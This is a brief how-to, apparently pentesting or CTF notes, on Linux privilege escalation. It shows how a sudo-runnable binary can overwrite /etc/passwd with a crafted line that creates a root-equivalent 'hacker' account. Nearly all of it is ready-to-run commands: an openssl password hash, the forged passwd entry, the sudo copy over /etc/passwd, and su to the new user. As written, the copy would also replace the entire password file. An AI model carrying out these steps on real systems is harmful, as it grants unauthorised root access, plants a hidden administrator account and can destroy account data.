If a user can run a binary file using sudo as root, you can use the bianry file to create a new priviledged user:

First, check out /etc/passwd
Copy the line for the root user:
```
root:x:0:0:root:/root:/bin/bash
```

Now generate a password for the new user (eg.: hacker)
```
openssl passwd -1 hack
```

You should get a encrypted password now, e.g.
```
$1$wo.UnNDl$.RGkkUe1vug/G8oI267Ua/
```

Copy yje password into the line you copied from the root, and  replace the username, password and home directory so that it looks like this:
```
hacker:$1$wo.UnNDl$.RGkkUe1vug/G8oI267Ua/:0:0:root:/home/hacker:/bin/bash
```

Create a file in the TmP directory (e.g.: ak) and paste the content into the file.
```
nano /tmp/ak

# Paste:
hacker:$1$wo.UnNDl$.RGkkUe1vug/G8oI267Ua/:0:0:root:/home/hacker:/bin/bash
```

Now execute the command using sudo, and then move the file /tmp/ak into /etc/passwd
```
sudo ./test /tmp/ak /etc/passwd
```

Check if the newly create user wat created in the password file
```
cat /etc/passwd
```

Now su to the newly created user, you should have root access now.
```
su hacker
```